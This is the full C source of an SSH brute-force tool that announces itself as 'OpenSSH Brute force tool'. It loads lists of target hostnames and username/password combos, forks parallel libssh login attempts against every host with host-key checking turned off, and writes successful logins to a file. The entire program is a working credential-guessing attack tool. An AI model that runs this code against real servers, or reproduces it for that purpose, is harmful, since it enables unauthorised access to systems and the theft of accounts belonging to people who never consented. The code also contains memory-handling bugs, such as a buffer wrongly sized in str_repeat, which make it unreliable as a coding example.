#include "cbrutekrag.h"

int verbose = 0;
int timeout = 1;

char** str_split(char* a_str, const char a_delim)
{
    char** result = 0;
    size_t count = 0;
    char* tmp = a_str;
    char* last_comma = 0;
    char delim[2];
    delim[0] = a_delim;
    delim[1] = 0;

    /* Count how many elements will be extracted. */
    while (*tmp) {
        if (a_delim == *tmp) {
            count++;
            last_comma = tmp;
        }
        tmp++;
    }

    /* Add space for trailing token. */
    count += last_comma < (a_str + strlen(a_str) - 1);

    /* Add space for terminating null string so caller
       knows where the list of returned strings ends. */
    count++;

    result = malloc(sizeof(char*) * count);

    if (result) {
        size_t idx  = 0;
        char* token = strtok(a_str, delim);

        while (token) {
            assert(idx < count);
            *(result + idx++) = strdup(token);
            token = strtok(0, delim);
        }
        assert(idx == count - 1);
        *(result + idx) = 0;
    }

    return result;
}

void print_error(const char *format, ...)
{
    va_list arg;
    fprintf(stderr, "\033[91m");
    va_start(arg, format);
    vfprintf(stderr, format, arg);
    va_end (arg);
    fprintf(stderr, "\033[0m\n");
}

void print_debug(const char *format, ...)
{
    if (verbose != 1) {
        return;
    }
    va_list arg;
    fprintf(stderr, "\033[37m");
    va_start(arg, format);
    vfprintf(stderr, format, arg);
    va_end (arg);
    fprintf(stderr, "\033[0m\n");
}

const char *str_repeat(char *str, size_t times)
{
    if (times < 1) return NULL;
    char *ret = malloc(sizeof(str) * times + 1);
    if (ret == NULL) return NULL;
    strcpy(ret, str);
    while (--times > 0) {
        strcat(ret, str);
    }
    return ret;
}

void update_progress(int count, int total, char* suffix, int bar_len)
{
    if (bar_len < 0) bar_len = 60;
    if (suffix == NULL) suffix = "";

    int filled_len = bar_len * count / total;
    int empty_len = bar_len - filled_len;
    float percents = 100.0f * count / total;

    printf("\033[37m[");
    if (filled_len > 0) printf("\033[32m%s", str_repeat("=", filled_len));
    printf("\033[37m%s\033[37m]\033[0m", str_repeat("-", empty_len));
    printf("  %.2f%%   %s\r", percents, suffix);
    fflush(stdout);
}

void print_banner()
{
    printf(
        "\033[92m      _                _       _\n"
        "     | |              | |     | |\n"
        "     | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _\n"
        "     | '_ \\| '__| | | | __/ _ \\ |/ / '__/ _` |/ _` |\n"
        "     | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |\n"
        "     |_.__/|_|   \\__,_|\\__\\___|_|\\_\\_|  \\__,_|\\__, |\n"
        "            \033[0m\033[1mOpenSSH Brute force tool 0.3.1\033[92m     __/ |\n"
        "          \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m\n\n"
    );
}

int try_login(const char *hostname, const char *username, const char *password)
{
    ssh_session my_ssh_session;
    int verbosity = 0;
    int port = 22;

    if (verbose) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    my_ssh_session = ssh_new();

    if (my_ssh_session == NULL) {
        return -1;
    }

    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_KEY_EXCHANGE, NULL);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOSTKEYS, NULL);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);

    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, username);



    int r;
    r = ssh_connect(my_ssh_session);
    if (r != SSH_OK) {
        ssh_free(my_ssh_session);
        if (verbose) {
            print_error(
                "Error connecting to %s: %s\n",
                hostname,
                ssh_get_error(my_ssh_session)
            );
        }
        return -1;
    }

    r = ssh_userauth_password(my_ssh_session, username, password);
    if (r != SSH_AUTH_SUCCESS) {
        if (verbose) {
            print_error(
                "Error authenticating with password: %s\n",
                ssh_get_error(my_ssh_session)
            );
        }
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        return -1;
    }

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    return 0;
}

wordlist_t load_wordlist(char *filename)
{
    FILE* fp;
    wordlist_t ret;
    char **words = NULL;
    ssize_t read;
    char *temp = 0;
    size_t len;

    fp = fopen(filename, "r");
    if (fp == NULL) {
        print_error("Error opening file. (%s)\n", filename);
        exit(EXIT_FAILURE);
    }

    for (int i = 0; (read = getline(&temp, &len, fp)) != -1; i++) {
        strtok(temp, "\n");
        if (words == NULL) {
            words = malloc(sizeof(temp));
            *words = strdup(temp);
        } else {
            words = realloc(words, sizeof(temp) * (i + 1));
            *(words + i) = strdup(temp);
        }
        ret.lenght = i + 1;
    }
    fclose(fp);

    ret.words = words;

    return ret;
}

int brute(char *hostname, char *username, char *password, int count, int total, FILE *output)
{
    char bar_suffix[50];
    sprintf(bar_suffix, "[%d] %s %s %s", count, hostname, username, password);

    update_progress(count, total, bar_suffix, 80);
    int ret = try_login(hostname, username, password);
    if (ret == 0) {
        print_debug("LOGIN OK!\t%s\t%s\t%s\n", hostname, username, password);
        if (output != NULL) {
            fprintf(output, "LOGIN OK!\t%s\t%s\t%s\n", hostname, username, password);
        }
        return 0;
    } else {
        print_debug("LOGIN FAIL\t%s\t%s\t%s\n", hostname, username, password);
    }
    return -1;
}

int main(int argc, char** argv)
{
    int opt;
    int total = 0;
    int THREADS = 1;
    char *hostnames_filename = NULL;
    char *combos_filename = NULL;
    char *output_filename = NULL;
    FILE *output;

    while ((opt = getopt(argc, argv, "T:C:t:o:v")) != -1) {
        switch (opt) {
            case 'v':
                verbose = 1;
                break;
            case 'T':
                hostnames_filename = optarg;
                break;
            case 'C':
                combos_filename = optarg;
                break;
            case 't':
                THREADS = atoi(optarg);
                break;
            case 'o':
                output_filename = optarg;
                break;
            default:
            print_error("Usage: %s [-v -T hostnames.txt -t THREADS] [file...]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }
    print_banner();

    if (hostnames_filename == NULL) {
        hostnames_filename = strdup("hostnames.txt");
    }
    if (combos_filename == NULL) {
        combos_filename = strdup("combos.txt");
    }

    wordlist_t hostnames = load_wordlist(hostnames_filename);
    wordlist_t combos = load_wordlist(combos_filename);
    total = hostnames.lenght * combos.lenght;

    printf("\nCantidad de combos: %zu\n", combos.lenght);
    printf("Cantidad de hostnames: %zu\n", hostnames.lenght);
    printf("Combinaciones totales: %d\n\n", total);
    printf("Cantidad de threads: %d\n\n", THREADS);

    if (output_filename != NULL) {
        output = fopen(output_filename, "a");
        if (output == NULL) {
            print_error("Error opening output file. (%s)\n", output_filename);
            exit(EXIT_FAILURE);
        }
    }

    pid_t pids[THREADS];

    for(int i = 0; i < THREADS; i++){
		pids[i] = 0;
	}

    pid_t tmp;
    int p = 0;

    int count = 0;
    for (int x = 0; x < combos.lenght; x++) {
        char **login_data = str_split(combos.words[x], ' ');
        if (login_data == NULL) {
            continue;
        }
        // strtok(login_data[1], "$BLANKPASS");
        for (int y = 0; y < hostnames.lenght; y++) {
            print_debug(
                "HOSTNAME=%s\tUSUARIO=%s\tPASSWORD=%s\n",
                hostnames.words[y],
                login_data[0],
                login_data[1]
            );

            tmp = fork();

            if (tmp) {
                pids[p] = tmp;
            } else if(tmp == 0) {
                brute(hostnames.words[y], login_data[0], login_data[1], count, total, output);
                exit(EXIT_SUCCESS);
            } else {
                print_error("Fork failed!\n\n");
            }
            p++;

            if (p == THREADS){
                for (int i = 0; i < THREADS; i++) {
                    waitpid(pids[i], NULL, 0);
                }

                for (int i = 0; i < THREADS; i++) {
                    pids[i] = 0;
                }
                p = 0;
            }

            count++;
        }
    }

    if (output != NULL) {
        fclose(output);
    }

    exit(EXIT_SUCCESS);
}
